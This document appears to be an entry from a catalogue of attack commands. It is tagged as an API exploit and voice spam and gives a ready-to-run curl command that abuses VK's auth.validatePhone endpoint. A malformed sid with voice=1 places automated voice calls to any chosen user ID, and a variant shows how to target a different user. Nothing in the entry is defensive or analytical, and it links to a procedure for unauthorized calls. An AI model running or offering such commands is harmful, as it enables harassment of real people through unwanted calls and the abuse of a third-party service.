---
id: cmd-vk-voice-001
data: >-
  curl
  "https://api.vk.com/method/auth.validatePhone?sid=2fa_66748_блаблабла&voice=1"
tags:
  - api-exploit
  - voice-spam
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.677Z'
verified: false
validated: true
submitted: true
---
# vk-auth-validatephone-voice-spam

## Command

```bash
curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_66748_блаблабла&voice=1"
```

## Description

Initiates a voice call to user ID 66748 by adding the voice=1 parameter to a malformed sid request, exploiting the API for voice spam.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `sid` | Malformed sid '2fa_66748_блаблабла' | Yes |
| `voice` | Set to 1 to trigger voice call instead of SMS | Yes |

## Examples

### Basic Usage

```bash
curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_66748_блаблабла&voice=1"
```

### Advanced Usage

For different user:

```bash
curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_12345_text&voice=1"
```

## Expected Output

API success response, with an automated voice call placed to the target user's phone.

## Related

- [[commands/vk-auth-validatephone-unicode-sms]]
- [[procedures/Trigger-Unauthorized-Voice-Call-Via-Malformed-SID]]
